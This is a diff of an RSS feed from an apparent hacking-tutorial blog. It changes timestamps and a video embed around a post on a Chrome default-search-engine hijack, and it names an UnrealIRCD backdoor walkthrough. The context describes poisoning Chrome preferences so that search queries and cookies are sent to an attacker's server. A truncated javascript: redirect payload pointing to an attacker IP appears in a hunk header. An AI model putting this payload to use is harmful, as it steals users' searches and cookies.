@@ -2,8 +2,8 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.net/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sat, 02 Jul 2016 19:59:14 +1000</lastBuildDate>
-<pubDate>Sat, 02 Jul 2016 19:59:14 +1000</pubDate>
+<lastBuildDate>Sat, 02 Jul 2016 20:15:57 +1000</lastBuildDate>
+<pubDate>Sat, 02 Jul 2016 20:15:57 +1000</pubDate>
 <atom:link href="https://metalkey.net/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Google Chrome Search Poison – Default Search Engine Exploit
@@ -18,8 +18,11 @@ Note: The vulnerability has been reported to the Chromium team but they will not
 
 <h2>Video Demo</h2>
 
-<p><a href="https://www.youtube.com/watch?v=WoF-LkA6fMk">https://www.youtube.com/watch?v=WoF-LkA6fMk</a><br>
-The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.</p>
+<div align="center">
+<iframe width="420" height="315" src="http://www.youtube.com/embed/WoF-LkA6fMk?autoplay=0"></iframe>
+</div>
+
+<p>The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.<br></p>
 
 <h2>Walkthrough - Setting up the Listener in Kali</h2>
 
@@ -77,7 +80,7 @@ javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.produ
 ]]></description><link>https://metalkey.net/google-chrome-search-poison---default-search-engine-exploit.html</link>
 <guid>https://metalkey.net/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 02 Jul 2016 19:59:13 +1000</pubDate></item>
+<pubDate>Sat, 02 Jul 2016 20:15:56 +1000</pubDate></item>
 <item><title>
 UnrealIRCD 3.2.8.1 Backdoor Command Execution
 </title><description><![CDATA[
